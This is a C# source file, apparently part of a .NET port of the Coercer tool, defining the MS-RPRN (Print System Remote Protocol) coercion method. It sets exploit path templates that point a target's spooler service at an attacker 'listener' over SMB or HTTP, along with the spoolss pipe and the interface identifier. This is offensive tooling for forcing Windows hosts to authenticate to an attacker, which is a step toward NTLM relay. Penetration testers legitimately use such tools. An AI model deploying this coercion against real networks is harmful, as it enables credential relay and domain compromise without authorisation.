using Coercer_dotnet.structures;

namespace Coercer_dotnet.methods.MS_RPRN
{
    public abstract class MS_RPRN : Method
    {
        protected MS_RPRN(AuthType authType, string listener) : base(authType, listener) { }
        protected MS_RPRN(AuthType authType, string listener, int port) : base(authType, listener, port) { }
        protected MS_RPRN(AuthType authType, string listener, int httpPort, int smbPort) : base(authType, listener, httpPort, smbPort) { }
        public override string Author => "";
        public override ExploitPathTemplate[] ExploitPathTemplates => new ExploitPathTemplate[]
        {
            new(AuthType.SMB, "\\\\{{listener}}\x00"),
            new(AuthType.HTTP, "\\\\{{listener}}@{{port}}/{{3}}\x00")
        };
        public override NcanNpAccess[] NcanNpAccesses => new NcanNpAccess[] { new("\\PIPE\\spoolss", "12345678-1234-abcd-ef00-0123456789ab", "1.0") };
        public override NcacnIpTcpAccess[] NcacnIpTcpAccesses => new NcacnIpTcpAccess[] { new("12345678-1234-abcd-ef00-0123456789ab", "1.0") };
        public override Protocol Protocol => new("[MS-RPRN]: Print System Remote Protocol", "MS-RPRN");
    }
}